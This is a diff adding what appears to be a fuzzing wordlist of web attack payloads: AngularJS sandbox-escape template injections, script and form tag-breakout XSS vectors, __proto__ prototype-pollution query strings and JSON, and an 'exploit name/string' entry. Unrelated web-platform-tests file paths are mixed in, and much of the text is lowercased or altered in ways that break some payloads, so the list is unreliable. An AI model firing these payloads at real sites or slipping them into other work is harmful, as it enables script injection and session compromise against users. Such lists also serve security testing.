@@ -1,3 +1,70 @@
-constructor.prototype.test=test
-__proto__[test]=test
+"><form id="myform" value=""+{valueof:location,length:1,__proto__:[],0:"javascript :alert (1)"}"action=javascript&tab;:eval(document.getelementbyid('myform').elements[0].value)><textarea>alert(1)</textarea><input type="submit" value="absenden"></form>
+"><script>[{'a':object.prototype.__definesetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>
+'><form id="myform" value=""+{valueof:location,length:1,__proto__:[],0:"javascript :alert (1)"}"action=javascript&tab;:eval(document.getelementbyid('myform').elements[0].value)><textarea>alert(1)</textarea><input type="submit" value="absenden"></form>
+'><script>[{'a':object.prototype.__definesetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>
+'a'.constructor.prototype.charat=''.valueof;
+'a'.constructor.prototype.charat=[].join;
+'a'[{tostring:false,valueof:[].join,length:1,0:'__proto__'}].charat=[].join;
+(_=''.sub).call.call({}[$='constructor'].getownpropertydescriptor(_.__proto__,$).value,0,'eval("
+/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*{{'a'.constructor.prototype.charat=[].join;$eval('x=1} } };alert(1)//');}}
+/blog/?__proto__[polluted]=polluted
+<div id="54"><script>[{'a':object.prototype.__definesetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>//["'`-->]]>]</div><div id="55"><video><source onerror="alert(55)">//["'`-->]]>]</div><div id="56"><video onerror="alert(56)"><source></source></video>//["'`-->]]>]</div><div id="57"><b <script>alert(57)//</script>0</script></b>//["'`-->]]>]</div><div id="58"><b><script<b></b><alert(58)</script </b></b>//["'`-->]]>]</div><div id="59"><div id="div1"><input value="``onmouseover=alert(59)"></div> <div id="div2"></div><script>document.getelementbyid("div2").innerhtml = document.getelementbyid("div1").innerhtml;</script>//["'`-->]]>]</div><div id="60"><div style="[a]color[b]:[c]red">xxx</div>//["'`-->]]>]</div>
+<form id="myform" value=""+{valueof:location,length:1,__proto__:[],0:"javascript :alert (1)"}"action=javascript&tab;:eval(document.getelementbyid('myform').elements[0].value)><textarea>alert(1)</textarea><input type="submit" value="absenden"></form>
 <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.js"></script><div ng-app>{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} Garrett(1);//');}}</div>
+<script>[{'a':object.prototype.__definesetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>
+? $$watchers[0].get(tostring.constructor.prototype)
+?__proto__[protopollut]=protopollut
+__proto__
+__proto__ stored js alert
+__proto__[test]=test
+a=tostring().constructor.prototype;a.charat=a.trim;
+constructor.prototype.test=test
+delete []['__proto__']['tostring'];[]['__proto__'][symbol.tostringtag]='=alert(1)';eval([1,2,3]+'');
+exploit description: this vector uses the __proto__ property to store the alert function and execute it afterwards with new label.
+exploit name: __proto__ stored js alert
+exploit string: top.__proto__._= alert
+iframe.contentwindow.location.constructor.prototype
+javascript:htmldocument.__proto__.__definesetter__("prototype",function(){try{d.d.d}catch(e){confirm(e.stack)}})
+json.parse('{"__proto__":["a",1]}')
+object.prototype.freeze.html
+object.prototype.freeze.html.ini
+object.prototype.getownpropertynames.html
+object.prototype.hasownproperty-order.html
+object.prototype.hasownproperty-prototype-chain.html
+object.prototype.preventextensions.html
+object.prototype.preventextensions.html.ini
+object.prototype.seal.html
+object.prototype.seal.html.ini
+object.prototype[symbol.tostringtag]='<svg/onload=alert(1)>';location='javascript:1+{}'
+object.prototype[symbol.tostringtag]='<svg/onload=alert(1)>';while(1){}location='javascript:1+{}'
+tests/wpt/web-platform-tests/js/builtins/object.prototype.freeze.html
+tests/wpt/web-platform-tests/js/builtins/object.prototype.getownpropertynames.html
+tests/wpt/web-platform-tests/js/builtins/object.prototype.hasownproperty-order.html
+tests/wpt/web-platform-tests/js/builtins/object.prototype.hasownproperty-prototype-chain.html
+tests/wpt/web-platform-tests/js/builtins/object.prototype.preventextensions.html
+tests/wpt/web-platform-tests/js/builtins/object.prototype.seal.html
+top.__proto__._= alert
+tostring.constructor.prototype.tostring=tostring.constructor.prototype.call;
+{"source":{},"__proto__":{"source":"$`onerror=prompt(1)>"}}
+{{'a'.constructor.prototype.charat=''.valueof;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
+{{'a'.constructor.prototype.charat=[].join;$eval('x=1} } };alert(1)//');}}
+{{'a'.constructor.prototype.charat=[].join;$eval('x=1}}};alert(1)//');}}
+{{'a'.constructor.prototype.charat=[].join;$eval('x=alert(1)');}}
+{{'a'.constructor.prototype.charat=[].join;eval('x=1} } };alert(1)//');}}
+{{'a'.constructor.prototype['char\u0041t']=''.concat;$eval("x='\"-(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
+{{'a'[{tostring:[].join,length:1,0:'__proto__'}].charat=''.valueof;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");}}
+{{'a'[{tostring:false,valueof:[].join,length:1,0:'__proto__'}].charat=[].join;$eval('x=alert(1)//');}}
+{{(_="".sub).call.call({}[$="constructor"].getownpropertydescriptor(_.__proto__,$).value,0,"alert(1)")()}}
+{{(_="".sub).call.call({}[$="constructor"].getownpropertydescriptor(_.__proto__,$).value,0,"alert(1)")()}}zzzz
+{{(_=''.sub).call.call({}[$='constructor'].getownpropertydescriptor(_.__proto__,$).value,0,'alert(1)')()}}
+{{(tostring()).constructor.prototype.charat=(tostring()).constructor.prototype.concat;$eval((tostring()).constructor.fromcharcode(120,61,97,108,101,114,116,40,49,41))}}
+{{tostring.constructor.prototype.tostring=tostring.constructor.prototype.call%3b[%22a%22,%22alert(1)%22].sort(tostring.constructor)}}
+{{tostring.constructor.prototype.tostring=tostring.constructor.prototype.call;["a","alert(1)"].sort(tostring.constructor);}}
+{{tostring.constructor.prototype.tostring=tostring.constructor.prototype.call;["a","alert(1)"].sort(tostring.constructor)}}
+{{x = {'y':''.constructor.prototype}; x['y'].charat=[].join;$eval('x=alert(1)');}}
+{{x=767015343;y=50986827;a=x.tostring(36)+y.tostring(36);a.sub.call.call({}[a].getownpropertydescriptor(a.sub.__proto__,a).value,0,tostring()[a].fromcharcode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
+{{x=767015343;y=50986827;a=x.tostring(36)+y.tostring(36);a.sub.call.call({}[a].getownpropertydescriptor(a.sub.__proto__,a).value,0,tostring()[a].fromcodepoint(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
+{{{}[{tostring:[].join,length:1,0:'__proto__'}].assign=[].join;
+{{{}[{tostring:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charat=''.valueof;$eval('x=alert(1)//');}}
+{{{}[{tostring:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charat=[].join;$eval('x=alert(1)//');}}
+{}[{tostring:[].join,length:1,0:'__proto__'}].assign=[].join;
